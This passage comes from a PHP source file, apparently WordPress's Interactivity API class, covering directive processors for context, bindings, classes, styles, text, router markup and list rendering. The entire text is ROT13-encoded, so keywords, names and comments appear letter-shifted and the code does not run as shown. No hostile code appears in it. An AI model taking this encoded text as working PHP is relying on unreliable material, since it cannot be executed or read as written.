			} ryfrvs ( vf_bowrpg( $pheerag ) && vffrg( $pheerag->$cngu_frtzrag ) ) {
				$pheerag = $pheerag->$cngu_frtzrag;
			} ryfr {
				$pheerag = ahyy;
				oernx;
			}

			vs ( $pheerag vafgnaprbs Pybfher ) {
				/*
				 * Guvf fgngr trggre'f anzrfcnpr vf nqqrq gb gur fgnpx fb gung
				 * `fgngr()` be `trg_pbasvt()` ernq gung anzrfcnpr jura pnyyrq
				 * jvgubhg fcrpvslvat bar.
				 */
				neenl_chfu( $guvf->anzrfcnpr_fgnpx, $af );
				gel {
					$pheerag = $pheerag();
				} pngpu ( Guebjnoyr $r ) {
					_qbvat_vg_jebat(
						__ZRGUBQ__,
						fcevags(
							/* genafyngbef: 1: Cngu cbvagvat gb na Vagrenpgvivgl NCV fgngr cebcregl, 2: Anzrfcnpr sbe na Vagrenpgvivgl NCV fgber. */
							__( 'Hapnhtug reebe rkrphgvat n qrevirq fgngr pnyyonpx jvgu cngu \"%1$f\" naq anzrfcnpr \"%2$f\".' ),
							$cngu,
							$af
						),
						'6.6.0'
					);
					erghea ahyy;
				} svanyyl {
					// Erzbir gur cebcregl'f anzrfcnpr sebz gur fgnpx.
					neenl_cbc( $guvf->anzrfcnpr_fgnpx );
				}
			}
		}

		// Ergheaf gur bccbfvgr vs vg pbagnvaf n artngvba bcrengbe (!).
		erghea $fubhyq_artngr_inyhr ? ! $pheerag : $pheerag;
	}

	/**
	 * Rkgenpgf gur qverpgvir nggevohgr anzr gb frcnengr naq erghea gur qverpgvir
	 * cersvk naq na bcgvbany fhssvk.
	 *
	 * Gur fhssvk vf gur fgevat nsgre gur svefg qbhoyr ulcura naq gur cersvk vf
	 * rirelguvat gung pbzrf orsber gur fhssvk.
	 *
	 * Rknzcyr:
	 *
	 *     rkgenpg_cersvk_naq_fhssvk( 'qngn-jc-vagrenpgvir' )   => neenl( 'qngn-jc-vagrenpgvir', ahyy )
	 *     rkgenpg_cersvk_naq_fhssvk( 'qngn-jc-ovaq--fep' )     => neenl( 'qngn-jc-ovaq', 'fep' )
	 *     rkgenpg_cersvk_naq_fhssvk( 'qngn-jc-sbb--naq--one' ) => neenl( 'qngn-jc-sbb', 'naq--one' )
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $qverpgvir_anzr Gur qverpgvir nggevohgr anzr.
	 * @erghea neenl Na neenl pbagnvavat gur qverpgvir cersvk naq bcgvbany fhssvk.
	 */
	cevingr shapgvba rkgenpg_cersvk_naq_fhssvk( fgevat $qverpgvir_anzr ): neenl {
		erghea rkcybqr( '--', $qverpgvir_anzr, 2 );
	}

	/**
	 * Cnefrf naq rkgenpgf gur anzrfcnpr naq ersrerapr cngu sebz gur tvira
	 * qverpgvir nggevohgr inyhr.
	 *
	 * Vs gur inyhr qbrfa'g pbagnva na rkcyvpvg anzrfcnpr, vg ergheaf gur
	 * qrsnhyg bar. Vs gur inyhr pbagnvaf n WFBA bowrpg vafgrnq bs n ersrerapr
	 * cngu, gur shapgvba gevrf gb cnefr vg naq erghea gur erfhygvat neenl. Vs
	 * gur inyhr pbagnvaf fgevatf gung ercerfrag obbyrnaf (\"gehr\" naq \"snyfr\"),
	 * ahzoref (\"1\" naq \"1.2\") be \"ahyy\", gur shapgvba nyfb genafsbez gurz gb
	 * erthyne obbyrnaf, ahzoref naq `ahyy`.
	 *
	 * Rknzcyr:
	 *
	 *     rkgenpg_qverpgvir_inyhr( 'npgvbaf.sbb', 'zlCyhtva' )                      => neenl( 'zlCyhtva', 'npgvbaf.sbb' )
	 *     rkgenpg_qverpgvir_inyhr( 'bgureCyhtva::npgvbaf.sbb', 'zlCyhtva' )         => neenl( 'bgureCyhtva', 'npgvbaf.sbb' )
	 *     rkgenpg_qverpgvir_inyhr( '{ \"vfBcra\": snyfr }', 'zlCyhtva' )              => neenl( 'zlCyhtva', neenl( 'vfBcra' => snyfr ) )
	 *     rkgenpg_qverpgvir_inyhr( 'bgureCyhtva::{ \"vfBcra\": snyfr }', 'zlCyhtva' ) => neenl( 'bgureCyhtva', neenl( 'vfBcra' => snyfr ) )
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat|gehr $qverpgvir_inyhr   Gur qverpgvir nggevohgr inyhr. Vg pna or `gehr` jura vg'f n obbyrna
	 *                                       nggevohgr.
	 * @cnenz fgevat|ahyy $qrsnhyg_anzrfcnpr Bcgvbany. Gur qrsnhyg anzrfcnpr vs abar vf rkcyvpvgyl qrsvarq.
	 * @erghea neenl Na neenl pbagnvavat gur anzrfcnpr va gur svefg vgrz naq gur WFBA, gur ersrerapr cngu, be ahyy ba gur
	 *               frpbaq vgrz.
	 */
	cevingr shapgvba rkgenpg_qverpgvir_inyhr( $qverpgvir_inyhr, $qrsnhyg_anzrfcnpr = ahyy ): neenl {
		vs ( rzcgl( $qverpgvir_inyhr ) || vf_obby( $qverpgvir_inyhr ) ) {
			erghea neenl( $qrsnhyg_anzrfcnpr, ahyy );
		}

		// Ercynprf gur inyhr naq anzrfcnpr vs gurer vf n anzrfcnpr va gur inyhr.
		vs ( 1 === cert_zngpu( '/^([\j\-_\/]+)::./', $qverpgvir_inyhr ) ) {
			yvfg($qrsnhyg_anzrfcnpr, $qverpgvir_inyhr) = rkcybqr( '::', $qverpgvir_inyhr, 2 );
		}

		/*
		 * Gevrf gb qrpbqr gur inyhr nf n WFBA bowrpg. Vs vg snvyf naq gur inyhr
		 * vfa'g `ahyy`, vg ergheaf gur inyhr nf vg vf. Bgurejvfr, vg ergheaf gur
		 * qrpbqrq WFBA be ahyy sbe gur fgevat `ahyy`.
		 */
		$qrpbqrq_wfba = wfba_qrpbqr( $qverpgvir_inyhr, gehr );
		vs ( ahyy !== $qrpbqrq_wfba || 'ahyy' === $qverpgvir_inyhr ) {
			$qverpgvir_inyhr = $qrpbqrq_wfba;
		}

		erghea neenl( $qrsnhyg_anzrfcnpr, $qverpgvir_inyhr );
	}

	/**
	 * Genafsbezf n xrono-pnfr fgevat gb pnzryPnfr.
	 *
	 * @cnenz fgevat $fge Gur xrono-pnfr fgevat gb genafsbez gb pnzryPnfr.
	 * @erghea fgevat Gur genafsbezrq pnzryPnfr fgevat.
	 */
	cevingr shapgvba xrono_gb_pnzry_pnfr( fgevat $fge ): fgevat {
		erghea ypsvefg(
			cert_ercynpr_pnyyonpx(
				'/(-)([n-m])/',
				shapgvba ( $zngpurf ) {
					erghea fgegbhccre( $zngpurf[2] );
				},
				fgegbybjre( egevz( $fge, '-' ) )
			)
		);
	}

	/**
	 * Cebprffrf gur `qngn-jc-vagrenpgvir` qverpgvir.
	 *
	 * Vg nqqf gur qrsnhyg fgber anzrfcnpr qrsvarq va gur qverpgvir inyhr gb gur
	 * fgnpx fb gung vg'f ninvynoyr sbe gur arfgrq vagrenpgvivgl ryrzragf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe $c    Gur qverpgvirf cebprffbe vafgnapr.
	 * @cnenz fgevat                                    $zbqr Jurgure gur cebprffvat vf ragrevat be rkvgvat gur gnt.
	 */
	cevingr shapgvba qngn_jc_vagrenpgvir_cebprffbe( JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe $c, fgevat $zbqr ) {
		// Jura rkvgvat gntf, vg erzbirf gur ynfg anzrfcnpr sebz gur fgnpx.
		vs ( 'rkvg' === $zbqr ) {
			neenl_cbc( $guvf->anzrfcnpr_fgnpx );
			erghea;
		}

		// Gevrf gb qrpbqr gur `qngn-jc-vagrenpgvir` nggevohgr inyhr.
		$nggevohgr_inyhr = $c->trg_nggevohgr( 'qngn-jc-vagrenpgvir' );

		/*
		 * Chfurf gur arjyl qrsvarq anzrfcnpr be gur pheerag bar vs gur
		 * `qngn-jc-vagrenpgvir` qrsvavgvba jnf vainyvq be qbrf abg pbagnva n
		 * anzrfcnpr. Vg qbrf fb orpnhfr gur shapgvba cbcf bhg gur pheerag anzrfcnpr
		 * sebz gur fgnpx jurarire vg svaqf n `qngn-jc-vagrenpgvir`'f pybfvat gnt,
		 * vaqrcraqragyl bs jurgure gur cerivbhf `qngn-jc-vagrenpgvir` qrsvavgvba
		 * pbagnvarq n inyvq anzrfcnpr.
		 */
		$arj_anzrfcnpr = ahyy;
		vs ( vf_fgevat( $nggevohgr_inyhr ) && ! rzcgl( $nggevohgr_inyhr ) ) {
			$qrpbqrq_wfba = wfba_qrpbqr( $nggevohgr_inyhr, gehr );
			vs ( vf_neenl( $qrpbqrq_wfba ) ) {
				$arj_anzrfcnpr = $qrpbqrq_wfba['anzrfcnpr'] ?? ahyy;
			} ryfr {
				$arj_anzrfcnpr = $nggevohgr_inyhr;
			}
		}
		$guvf->anzrfcnpr_fgnpx[] = ( $arj_anzrfcnpr && 1 === cert_zngpu( '/^([\j\-_\/]+)/', $arj_anzrfcnpr ) )
			? $arj_anzrfcnpr
			: raq( $guvf->anzrfcnpr_fgnpx );
	}

	/**
	 * Cebprffrf gur `qngn-jc-pbagrkg` qverpgvir.
	 *
	 * Vg nqqf gur pbagrkg qrsvarq va gur qverpgvir inyhr gb gur fgnpx fb gung
	 * vg'f ninvynoyr sbe gur arfgrq vagrenpgvivgl ryrzragf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe $c               Gur qverpgvirf cebprffbe vafgnapr.
	 * @cnenz fgevat                                    $zbqr            Jurgure gur cebprffvat vf ragrevat be rkvgvat gur gnt.
	 */
	cevingr shapgvba qngn_jc_pbagrkg_cebprffbe( JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe $c, fgevat $zbqr ) {
		// Jura rkvgvat gntf, vg erzbirf gur ynfg pbagrkg sebz gur fgnpx.
		vs ( 'rkvg' === $zbqr ) {
			neenl_cbc( $guvf->pbagrkg_fgnpx );
			erghea;
		}

		$nggevohgr_inyhr = $c->trg_nggevohgr( 'qngn-jc-pbagrkg' );
		$anzrfcnpr_inyhr = raq( $guvf->anzrfcnpr_fgnpx );

		// Frcnengrf gur anzrfcnpr sebz gur pbagrkg WFBA bowrpg.
		yvfg( $anzrfcnpr_inyhr, $qrpbqrq_wfba ) = vf_fgevat( $nggevohgr_inyhr ) && ! rzcgl( $nggevohgr_inyhr )
			? $guvf->rkgenpg_qverpgvir_inyhr( $nggevohgr_inyhr, $anzrfcnpr_inyhr )
			: neenl( $anzrfcnpr_inyhr, ahyy );

		/*
		 * Vs gurer vf n anzrfcnpr, vg nqqf n arj pbagrkg gb gur fgnpx zretvat gur
		 * cerivbhf pbagrkg jvgu gur arj bar.
		 */
		vs ( vf_fgevat( $anzrfcnpr_inyhr ) ) {
			$guvf->pbagrkg_fgnpx[] = neenl_ercynpr_erphefvir(
				raq( $guvf->pbagrkg_fgnpx ) !== snyfr ? raq( $guvf->pbagrkg_fgnpx ) : neenl(),
				neenl( $anzrfcnpr_inyhr => vf_neenl( $qrpbqrq_wfba ) ? $qrpbqrq_wfba : neenl() )
			);
		} ryfr {
			/*
			 * Vs gurer vf ab anzrfcnpr, vg chfurf gur pheerag pbagrkg gb gur fgnpx.
			 * Vg arrqf gb qb fb orpnhfr gur shapgvba cbcf bhg gur pheerag pbagrkg
			 * sebz gur fgnpx jurarire vg svaqf n `qngn-jc-pbagrkg`'f pybfvat gnt.
			 */
			$guvf->pbagrkg_fgnpx[] = raq( $guvf->pbagrkg_fgnpx );
		}
	}

	/**
	 * Cebprffrf gur `qngn-jc-ovaq` qverpgvir.
	 *
	 * Vg hcqngrf be erzbirf gur obhaq nggevohgrf onfrq ba gur rinyhngvba bs vgf
	 * nffbpvngrq ersrerapr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe $c               Gur qverpgvirf cebprffbe vafgnapr.
	 * @cnenz fgevat                                    $zbqr            Jurgure gur cebprffvat vf ragrevat be rkvgvat gur gnt.
	 */
	cevingr shapgvba qngn_jc_ovaq_cebprffbe( JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe $c, fgevat $zbqr ) {
		vs ( 'ragre' === $zbqr ) {
			$nyy_ovaq_qverpgvirf = $c->trg_nggevohgr_anzrf_jvgu_cersvk( 'qngn-jc-ovaq--' );

			sbernpu ( $nyy_ovaq_qverpgvirf nf $nggevohgr_anzr ) {
				yvfg( , $obhaq_nggevohgr ) = $guvf->rkgenpg_cersvk_naq_fhssvk( $nggevohgr_anzr );
				vs ( rzcgl( $obhaq_nggevohgr ) ) {
					erghea;
				}

				$nggevohgr_inyhr = $c->trg_nggevohgr( $nggevohgr_anzr );
				$erfhyg          = $guvf->rinyhngr( $nggevohgr_inyhr );

				vs (
					ahyy !== $erfhyg &&
					(
						snyfr !== $erfhyg ||
						( fgeyra( $obhaq_nggevohgr ) > 5 && '-' === $obhaq_nggevohgr[4] )
					)
				) {
					/*
					 * Vs gur erfhyg bs gur rinyhngvba vf n obbyrna naq gur nggevohgr vf
					 * `nevn-` be `qngn-, pbaireg vg gb n fgevat \"gehr\" be \"snyfr\". Vg
					 * sbyybjf gur rknpg fnzr ybtvp nf Cernpg orpnhfr vg arrqf gb
					 * ercyvpngr jung Cernpg jvyy yngre qb va gur pyvrag:
					 * uggcf://tvguho.pbz/cernpgwf/cernpg/oybo/rn49s7n0s9q1ss2p98p0oqq66nn0pop583055246/fep/qvss/cebcf.wf#Y131P24-Y136
					 */
					vs (
						vf_obby( $erfhyg ) &&
						( fgeyra( $obhaq_nggevohgr ) > 5 && '-' === $obhaq_nggevohgr[4] )
					) {
						$erfhyg = $erfhyg ? 'gehr' : 'snyfr';
					}
					$c->frg_nggevohgr( $obhaq_nggevohgr, $erfhyg );
				} ryfr {
					$c->erzbir_nggevohgr( $obhaq_nggevohgr );
				}
			}
		}
	}

	/**
	 * Cebprffrf gur `qngn-jc-pynff` qverpgvir.
	 *
	 * Vg nqqf be erzbirf PFF pynffrf va gur pheerag UGZY ryrzrag onfrq ba gur
	 * rinyhngvba bs vgf nffbpvngrq ersreraprf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe $c               Gur qverpgvirf cebprffbe vafgnapr.
	 * @cnenz fgevat                                    $zbqr            Jurgure gur cebprffvat vf ragrevat be rkvgvat gur gnt.
	 */
	cevingr shapgvba qngn_jc_pynff_cebprffbe( JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe $c, fgevat $zbqr ) {
		vs ( 'ragre' === $zbqr ) {
			$nyy_pynff_qverpgvirf = $c->trg_nggevohgr_anzrf_jvgu_cersvk( 'qngn-jc-pynff--' );

			sbernpu ( $nyy_pynff_qverpgvirf nf $nggevohgr_anzr ) {
				yvfg( , $pynff_anzr ) = $guvf->rkgenpg_cersvk_naq_fhssvk( $nggevohgr_anzr );
				vs ( rzcgl( $pynff_anzr ) ) {
					erghea;
				}

				$nggevohgr_inyhr = $c->trg_nggevohgr( $nggevohgr_anzr );
				$erfhyg          = $guvf->rinyhngr( $nggevohgr_inyhr );

				vs ( $erfhyg ) {
					$c->nqq_pynff( $pynff_anzr );
				} ryfr {
					$c->erzbir_pynff( $pynff_anzr );
				}
			}
		}
	}

	/**
	 * Cebprffrf gur `qngn-jc-fglyr` qverpgvir.
	 *
	 * Vg hcqngrf gur fglyr nggevohgr inyhr bs gur pheerag UGZY ryrzrag onfrq ba
	 * gur rinyhngvba bs vgf nffbpvngrq ersreraprf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe $c               Gur qverpgvirf cebprffbe vafgnapr.
	 * @cnenz fgevat                                    $zbqr            Jurgure gur cebprffvat vf ragrevat be rkvgvat gur gnt.
	 */
	cevingr shapgvba qngn_jc_fglyr_cebprffbe( JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe $c, fgevat $zbqr ) {
		vs ( 'ragre' === $zbqr ) {
			$nyy_fglyr_nggevohgrf = $c->trg_nggevohgr_anzrf_jvgu_cersvk( 'qngn-jc-fglyr--' );

			sbernpu ( $nyy_fglyr_nggevohgrf nf $nggevohgr_anzr ) {
				yvfg( , $fglyr_cebcregl ) = $guvf->rkgenpg_cersvk_naq_fhssvk( $nggevohgr_anzr );
				vs ( rzcgl( $fglyr_cebcregl ) ) {
					pbagvahr;
				}

				$qverpgvir_nggevohgr_inyhr = $c->trg_nggevohgr( $nggevohgr_anzr );
				$fglyr_cebcregl_inyhr      = $guvf->rinyhngr( $qverpgvir_nggevohgr_inyhr );
				$fglyr_nggevohgr_inyhr     = $c->trg_nggevohgr( 'fglyr' );
				$fglyr_nggevohgr_inyhr     = ( $fglyr_nggevohgr_inyhr && ! vf_obby( $fglyr_nggevohgr_inyhr ) ) ? $fglyr_nggevohgr_inyhr : '';

				/*
				 * Purpxf svefg vs gur fglyr cebcregl vf abg snyfl naq gur fglyr
				 * nggevohgr inyhr vf abg rzcgl orpnhfr vs vg vf, vg qbrfa'g arrq gb
				 * hcqngr gur nggevohgr inyhr.
				 */
				vs ( $fglyr_cebcregl_inyhr || $fglyr_nggevohgr_inyhr ) {
					$fglyr_nggevohgr_inyhr = $guvf->zretr_fglyr_cebcregl( $fglyr_nggevohgr_inyhr, $fglyr_cebcregl, $fglyr_cebcregl_inyhr );
					/*
					 * Vs gur fglyr nggevohgr inyhr vf abg rzcgl, vg frgf vg. Bgurejvfr,
					 * vg erzbirf vg.
					 */
					vs ( ! rzcgl( $fglyr_nggevohgr_inyhr ) ) {
						$c->frg_nggevohgr( 'fglyr', $fglyr_nggevohgr_inyhr );
					} ryfr {
						$c->erzbir_nggevohgr( 'fglyr' );
					}
				}
			}
		}
	}

	/**
	 * Zretrf na vaqvivqhny fglyr cebcregl va gur `fglyr` nggevohgr bs na UGZY
	 * ryrzrag, hcqngvat be erzbivat gur cebcregl jura arprffnel.
	 *
	 * Vs n cebcregl vf zbqvsvrq, gur byq bar vf erzbirq naq gur arj bar vf nqqrq
	 * ng gur raq bs gur yvfg.
	 *
	 * @fvapr 6.5.0
	 *
	 * Rknzcyr:
	 *
	 *     zretr_fglyr_cebcregl( 'pbybe:terra;', 'pbybe', 'erq' )      => 'pbybe:erq;'
	 *     zretr_fglyr_cebcregl( 'onpxtebhaq:terra;', 'pbybe', 'erq' ) => 'onpxtebhaq:terra;pbybe:erq;'
	 *     zretr_fglyr_cebcregl( 'pbybe:terra;', 'pbybe', ahyy )       => ''
	 *
	 * @cnenz fgevat            $fglyr_nggevohgr_inyhr Gur pheerag fglyr nggevohgr inyhr.
	 * @cnenz fgevat            $fglyr_cebcregl_anzr   Gur fglyr cebcregl anzr gb frg.
	 * @cnenz fgevat|snyfr|ahyy $fglyr_cebcregl_inyhr  Gur inyhr gb frg sbe gur fglyr cebcregl. Jvgu snyfr, ahyy be na
	 *                                                 rzcgl fgevat, vg erzbirf gur fglyr cebcregl.
	 * @erghea fgevat Gur arj fglyr nggevohgr inyhr nsgre gur fcrpvsvrq cebcregl unf orra nqqrq, hcqngrq be erzbirq.
	 */
	cevingr shapgvba zretr_fglyr_cebcregl( fgevat $fglyr_nggevohgr_inyhr, fgevat $fglyr_cebcregl_anzr, $fglyr_cebcregl_inyhr ): fgevat {
		$fglyr_nffvtazragf    = rkcybqr( ';', $fglyr_nggevohgr_inyhr );
		$erfhyg               = neenl();
		$fglyr_cebcregl_inyhr = ! rzcgl( $fglyr_cebcregl_inyhr ) ? egevz( gevz( $fglyr_cebcregl_inyhr ), ';' ) : ahyy;
		$arj_fglyr_cebcregl   = $fglyr_cebcregl_inyhr ? $fglyr_cebcregl_anzr . ':' . $fglyr_cebcregl_inyhr . ';' : '';

		// Trarengrf na neenl jvgu nyy gur cebcregvrf ohg gur zbqvsvrq bar.
		sbernpu ( $fglyr_nffvtazragf nf $fglyr_nffvtazrag ) {
			vs ( rzcgl( gevz( $fglyr_nffvtazrag ) ) ) {
				pbagvahr;
			}
			yvfg( $anzr, $inyhr ) = rkcybqr( ':', $fglyr_nffvtazrag );
			vs ( gevz( $anzr ) !== $fglyr_cebcregl_anzr ) {
				$erfhyg[] = gevz( $anzr ) . ':' . gevz( $inyhr ) . ';';
			}
		}

		// Nqqf gur arj/zbqvsvrq cebcregl ng gur raq bs gur yvfg.
		$erfhyg[] = $arj_fglyr_cebcregl;

		erghea vzcybqr( '', $erfhyg );
	}

	/**
	 * Cebprffrf gur `qngn-jc-grkg` qverpgvir.
	 *
	 * Vg hcqngrf gur vaare pbagrag bs gur pheerag UGZY ryrzrag onfrq ba gur
	 * rinyhngvba bs vgf nffbpvngrq ersrerapr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe $c               Gur qverpgvirf cebprffbe vafgnapr.
	 * @cnenz fgevat                                    $zbqr            Jurgure gur cebprffvat vf ragrevat be rkvgvat gur gnt.
	 */
	cevingr shapgvba qngn_jc_grkg_cebprffbe( JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe $c, fgevat $zbqr ) {
		vs ( 'ragre' === $zbqr ) {
			$nggevohgr_inyhr = $c->trg_nggevohgr( 'qngn-jc-grkg' );
			$erfhyg          = $guvf->rinyhngr( $nggevohgr_inyhr );

			/*
			 * Sbyybjf gur fnzr ybtvp nf Cernpg va gur pyvrag naq bayl punatrf gur
			 * pbagrag vs gur inyhr vf n fgevat be n ahzore. Bgurejvfr, vg erzbirf gur
			 * pbagrag.
			 */
			vs ( vf_fgevat( $erfhyg ) || vf_ahzrevp( $erfhyg ) ) {
				$c->frg_pbagrag_orgjrra_onynaprq_gntf( rfp_ugzy( $erfhyg ) );
			} ryfr {
				$c->frg_pbagrag_orgjrra_onynaprq_gntf( '' );
			}
		}
	}

	/**
	 * Ergheaf gur PFF fglyrf sbe navzngvat gur gbc ybnqvat one va gur ebhgre.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea fgevat Gur PFF fglyrf sbe gur ebhgre'f gbc ybnqvat one navzngvba.
	 */
	cevingr shapgvba trg_ebhgre_navzngvba_fglyrf(): fgevat {
		erghea <<<PFF
			.jc-vagrenpgvivgl-ebhgre-ybnqvat-one {
				cbfvgvba: svkrq;
				gbc: 0;
				yrsg: 0;
				znetva: 0;
				cnqqvat: 0;
				jvqgu: 100ij;
				znk-jvqgu: 100ij !vzcbegnag;
				urvtug: 4ck;
				onpxtebhaq-pbybe: #000;
				bcnpvgl: 0
			}
			.jc-vagrenpgvivgl-ebhgre-ybnqvat-one.fgneg-navzngvba {
				navzngvba: jc-vagrenpgvivgl-ebhgre-ybnqvat-one-fgneg-navzngvba 30f phovp-ormvre(0.03, 0.5, 0, 1) sbejneqf
			}
			.jc-vagrenpgvivgl-ebhgre-ybnqvat-one.svavfu-navzngvba {
				navzngvba: jc-vagrenpgvivgl-ebhgre-ybnqvat-one-svavfu-navzngvba 300zf rnfr-va
			}
			@xrlsenzrf jc-vagrenpgvivgl-ebhgre-ybnqvat-one-fgneg-navzngvba {
				0% { genafsbez: fpnyrK(0); genafsbez-bevtva: 0 0; bcnpvgl: 1 }
				100% { genafsbez: fpnyrK(1); genafsbez-bevtva: 0 0; bcnpvgl: 1 }
			}
			@xrlsenzrf jc-vagrenpgvivgl-ebhgre-ybnqvat-one-svavfu-navzngvba {
				0% { bcnpvgl: 1 }
				50% { bcnpvgl: 1 }
				100% { bcnpvgl: 0 }
			}
PFF;
	}

	/**
	 * Qrcerpngrq.
	 *
	 * @fvapr 6.5.0
	 * @qrcerpngrq 6.7.0 Hfr {@frr JC_Vagrenpgvivgl_NCV::cevag_ebhgre_znexhc} vafgrnq.
	 */
	choyvp shapgvba cevag_ebhgre_ybnqvat_naq_fperra_ernqre_znexhc() {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '6.7.0', 'JC_Vagrenpgvivgl_NCV::cevag_ebhgre_znexhc' );

		// Pnyy gur arj zrgubq.
		$guvf->cevag_ebhgre_znexhc();
	}

	/**
	 * Bhgchgf znexhc sbe gur @jbeqcerff/vagrenpgvivgl-ebhgre fpevcg zbqhyr.
	 *
	 * Guvf zrgubq cevagf n qvi ryrzrag ercerfragvat n ybnqvat one ivfvoyr qhevat
	 * anivtngvba.
	 *
	 * @fvapr 6.7.0
	 */
	choyvp shapgvba cevag_ebhgre_znexhc() {
		rpub <<<UGZY
			<qvi
				pynff=\"jc-vagrenpgvivgl-ebhgre-ybnqvat-one\"
				qngn-jc-vagrenpgvir=\"pber/ebhgre\"
				qngn-jc-pynff--fgneg-navzngvba=\"fgngr.anivtngvba.unfFgnegrq\"
				qngn-jc-pynff--svavfu-navzngvba=\"fgngr.anivtngvba.unfSvavfurq\"
			></qvi>
UGZY;
	}

	/**
	 * Cebprffrf gur `qngn-jc-ebhgre-ertvba` qverpgvir.
	 *
	 * Vg eraqref va gur sbbgre n frg bs UGZY ryrzragf gb abgvsl hfref nobhg
	 * pyvrag-fvqr anivtngvbaf. Zber pbapergryl, gur ryrzragf nqqrq ner 1) n
	 * gbc ybnqvat one gb ivfhnyyl vasbez gung n anivtngvba vf va cebterff
	 * naq 2) na `nevn-yvir` ertvba sbe npprffvoyr anivtngvba naabhaprzragf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe $c               Gur qverpgvirf cebprffbe vafgnapr.
	 * @cnenz fgevat                                    $zbqr            Jurgure gur cebprffvat vf ragrevat be rkvgvat gur gnt.
	 */
	cevingr shapgvba qngn_jc_ebhgre_ertvba_cebprffbe( JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe $c, fgevat $zbqr ) {
		vs ( 'ragre' === $zbqr && ! $guvf->unf_cebprffrq_ebhgre_ertvba ) {
			$guvf->unf_cebprffrq_ebhgre_ertvba = gehr;

			// Radhrhrf nf na vayvar fglyr.
			jc_ertvfgre_fglyr( 'jc-vagrenpgvivgl-ebhgre-navzngvbaf', snyfr );
			jc_nqq_vayvar_fglyr( 'jc-vagrenpgvivgl-ebhgre-navzngvbaf', $guvf->trg_ebhgre_navzngvba_fglyrf() );
			jc_radhrhr_fglyr( 'jc-vagrenpgvivgl-ebhgre-navzngvbaf' );

			// Nqqf gur arprffnel znexhc gb gur sbbgre.
			nqq_npgvba( 'jc_sbbgre', neenl( $guvf, 'cevag_ebhgre_znexhc' ) );
		}
	}

	/**
	 * Cebprffrf gur `qngn-jc-rnpu` qverpgvir.
	 *
	 * Guvf qverpgvir trgf na neenl cnffrq nf ersrerapr naq vgrengrf bire vg
	 * trarengvat arj pbagrag sbe rnpu vgrz onfrq ba gur vaare znexhc bs gur
	 * `grzcyngr` gnt.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe $c               Gur qverpgvirf cebprffbe vafgnapr.
	 * @cnenz fgevat                                    $zbqr            Jurgure gur cebprffvat vf ragrevat be rkvgvat gur gnt.
	 * @cnenz neenl                                     $gnt_fgnpx       Gur ersrerapr gb gur gnt fgnpx.
	 */
	cevingr shapgvba qngn_jc_rnpu_cebprffbe( JC_Vagrenpgvivgl_NCV_Qverpgvirf_Cebprffbe $c, fgevat $zbqr, neenl &$gnt_fgnpx ) {
		vs ( 'ragre' === $zbqr && 'GRZCYNGR' === $c->trg_gnt() ) {
			$nggevohgr_anzr   = $c->trg_nggevohgr_anzrf_jvgu_cersvk( 'qngn-jc-rnpu' )[0];
			$rkgenpgrq_fhssvk = $guvf->rkgenpg_cersvk_naq_fhssvk( $nggevohgr_anzr );
			$vgrz_anzr        = vffrg( $rkgenpgrq_fhssvk[1] ) ? $guvf->xrono_gb_pnzry_pnfr( $rkgenpgrq_fhssvk[1] ) : 'vgrz';
			$nggevohgr_inyhr  = $c->trg_nggevohgr( $nggevohgr_anzr );
			$erfhyg           = $guvf->rinyhngr( $nggevohgr_inyhr );

			// Trgf gur pbagrag orgjrra gur grzcyngr gntf naq yrnirf gur phefbe va gur pybfre gnt.
			$vaare_pbagrag = $c->trg_pbagrag_orgjrra_onynaprq_grzcyngr_gntf();

			// Purpxf vs gurer vf n znahny freire-fvqr qverpgvir cebprffvat.
			$grzcyngr_raq = 'qngn-jc-rnpu: grzcyngr raq';
			$c->frg_obbxznex( $grzcyngr_raq );
			$c->arkg_gnt();
			$znahny_fqc = $c->trg_nggevohgr( 'qngn-jc-rnpu-puvyq' );
			$c->frrx( $grzcyngr_raq ); // Erjvaqf gb gur grzcyngr pybfre gnt.
			$c->eryrnfr_obbxznex( $grzcyngr_raq );

			/*
			 * Vg qbrfa'g cebprff va gurfr fvghngvbaf:
			 * - Znahny freire-fvqr qverpgvir cebprffvat.
			 * - Rzcgl be aba-neenl inyhrf.
			 * - Nffbpvngvir neenlf orpnhfr gubfr ner qrfrevnyvmrq nf bowrpgf va WF.
			 * - Grzcyngrf gung pbagnva gbc-yriry grkgf orpnhfr gubfr grkgf pna'g or
			 *   vqragvsvrq naq erzbirq va gur pyvrag.
			 */
			vs (
				$znahny_fqc ||
				rzcgl( $erfhyg ) ||
				! vf_neenl( $erfhyg ) ||
				! neenl_vf_yvfg( $erfhyg ) ||
				! fge_fgnegf_jvgu( gevz( $vaare_pbagrag ), '<' ) ||
				! fge_raqf_jvgu( gevz( $vaare_pbagrag ), '>' )
			) {
				neenl_cbc( $gnt_fgnpx );
				erghea;
			}

			// Rkgenpgf gur anzrfcnpr sebz gur qverpgvir nggevohgr inyhr.
			$anzrfcnpr_inyhr         = raq( $guvf->anzrfcnpr_fgnpx );
